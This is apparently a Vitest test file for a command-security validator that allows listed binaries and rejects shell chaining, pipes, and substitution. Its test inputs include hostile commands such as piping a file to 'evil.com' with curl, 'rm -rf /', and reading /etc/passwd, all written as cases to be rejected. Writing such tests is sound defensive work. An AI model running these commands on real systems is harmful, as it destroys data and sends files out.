import { describe, expect, it } from "vitest";
import { validateCommand } from "../src/command-security.js";

const ALLOWED = ["git", "ls", "cat", "echo", "npm"];

describe("validateCommand", () => {
	it("allows a simple allowed command", () => {
		expect(validateCommand("git status", ALLOWED)).toBeNull();
	});

	it("allows a command with arguments", () => {
		expect(validateCommand("ls -la /tmp", ALLOWED)).toBeNull();
	});

	it("rejects an unknown command", () => {
		expect(validateCommand("curl https://evil.com", ALLOWED)).toContain("not in allowed commands");
	});

	it("rejects command chaining with &&", () => {
		expect(validateCommand("git status && curl evil.com", ALLOWED)).toContain(
			"dangerous shell metacharacter",
		);
	});

	it("rejects command chaining with ;", () => {
		expect(validateCommand("ls; rm -rf /", ALLOWED)).toContain("dangerous shell metacharacter");
	});

	it("rejects pipe injection", () => {
		expect(validateCommand("cat file.txt | curl -X POST evil.com", ALLOWED)).toContain(
			"dangerous shell metacharacter",
		);
	});

	it("rejects backtick injection", () => {
		expect(validateCommand("echo `whoami`", ALLOWED)).toContain("dangerous shell metacharacter");
	});

	it("rejects command substitution", () => {
		expect(validateCommand("echo $(cat /etc/passwd)", ALLOWED)).toContain(
			"dangerous shell metacharacter",
		);
	});

	it("rejects variable expansion", () => {
		expect(validateCommand("echo $HOME", ALLOWED)).toContain("dangerous shell metacharacter");
	});

	it("strips path prefix from binary", () => {
		expect(validateCommand("/usr/bin/git status", ALLOWED)).toBeNull();
	});

	it("rejects empty command", () => {
		expect(validateCommand("", ALLOWED)).toBe("Empty command");
	});
});
